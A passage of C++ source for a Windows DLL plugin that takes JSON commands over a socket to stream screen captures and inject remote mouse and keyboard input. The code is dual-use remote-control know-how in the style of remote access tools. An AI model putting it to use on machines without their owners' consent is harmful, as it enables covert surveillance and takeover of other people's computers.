    safe_send_json(sock, response);
}

static void simulate_mouse(const string& event, int button, int x, int y) {
    RECT rect{};
    {
        lock_guard<mutex> lock(g_captureMutex);
        if (!g_hasCaptureRect) return;
        rect = g_captureRect;
    }

    // Normalized (0-65535) to Screen Absolute
    // x_abs = rect.left + (x * (rect.right - rect.left) / 65535)
    // SendInput uses MOUSEEVENTF_ABSOLUTE which maps 0-65535 to the virtual screen.

    int screen_x = rect.left + MulDiv(x, rect.right - rect.left, 65535);
    int screen_y = rect.top + MulDiv(y, rect.bottom - rect.top, 65535);

    // Map screen coordinate to MOUSEEVENTF_ABSOLUTE (0-65535 of virtual screen)
    int v_left = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int v_top = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int v_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int v_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    if (v_width <= 0 || v_height <= 0) return;

    double fx = (double)(screen_x - v_left) * (65535.0 / (double)(v_width - 1));
    double fy = (double)(screen_y - v_top) * (65535.0 / (double)(v_height - 1));

    INPUT input = {0};
    input.type = INPUT_MOUSE;
    input.mi.dx = (LONG)fx;
    input.mi.dy = (LONG)fy;
    input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;

    if (event == "move") {
        input.mi.dwFlags |= MOUSEEVENTF_MOVE;
    } else if (event == "down") {
        if (button == 0) input.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN;
        else if (button == 1) input.mi.dwFlags |= MOUSEEVENTF_RIGHTDOWN;
        else if (button == 2) input.mi.dwFlags |= MOUSEEVENTF_MIDDLEDOWN;
    } else if (event == "up") {
        if (button == 0) input.mi.dwFlags |= MOUSEEVENTF_LEFTUP;
        else if (button == 1) input.mi.dwFlags |= MOUSEEVENTF_RIGHTUP;
        else if (button == 2) input.mi.dwFlags |= MOUSEEVENTF_MIDDLEUP;
    }

    SendInput(1, &input, sizeof(INPUT));
}

static void simulate_key(const string& event, int vk) {
    INPUT input = {0};
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = (WORD)vk;
    if (event == "up") {
        input.ki.dwFlags = KEYEVENTF_KEYUP;
    }
    SendInput(1, &input, sizeof(INPUT));
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    send_monitor_list(sock);
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        json command = json::parse(commandJson ? commandJson : "{}");
        string action = command.value("action", "");

        if (action == "monitorlist") {
            send_monitor_list(sock);
            return;
        }

        if (action == "monitorstart") {
            int monitor = command.value("monitor", 0);
            int scale = command.value("scale", 50);
            int fps = command.value("fps", 0);
            start_capture(sock, monitor, scale, fps);
            return;
        }

        if (action == "monitorstop") {
            stop_capture_thread();

            json response;
            response["action"] = "monitorstatus";
            response["status"] = "stopped";
            safe_send_json(sock, response);
            return;
        }

        if (action == "mouseevent") {
            string event = command.value("event", "");
            int button = command.value("button", 0);
            int x = command.value("x", 0);
            int y = command.value("y", 0);
            simulate_mouse(event, button, x, y);
            return;
        }

        if (action == "keyevent") {
            string event = command.value("event", "");
            int vk = command.value("key", 0);
            simulate_key(event, vk);
            return;
        }

        send_monitor_error(sock, "Unknown monitoring action");
    } catch (const std::exception& e) {
        send_monitor_error(sock, string("Command parse failed: ") + e.what());
    } catch (...) {
        send_monitor_error(sock, "Command parse failed");
    }
}

BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_DETACH) {
        g_captureRunning.store(false);
        shutdown_gdiplus();
    }
    return TRUE;
}
